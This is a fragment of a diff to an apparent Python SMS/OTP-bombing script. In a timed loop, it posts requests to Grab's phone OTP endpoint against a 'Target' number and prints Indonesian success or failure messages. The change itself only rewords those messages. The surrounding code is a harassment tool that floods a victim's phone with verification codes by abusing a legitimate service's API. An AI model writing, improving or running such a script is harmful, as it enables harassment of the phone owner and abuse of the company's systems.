@@ -40,9 +40,9 @@ try:
 		idk=("challengeID")
 		r1 = requests.post('https://api.grab.com/grabid/v1/phone/otp',data=dt)
 		if str(idk) in str(r1.text):
-			print("[+] Target1 Berhasil!")
+			print("[+] Berhasil!")
 		else:
-			print("[-] Target1 Gagal!")
+			print("[-] Gagal!")
 		print("="*30)
 		time.sleep(1)
 except KeyboardInterrupt:
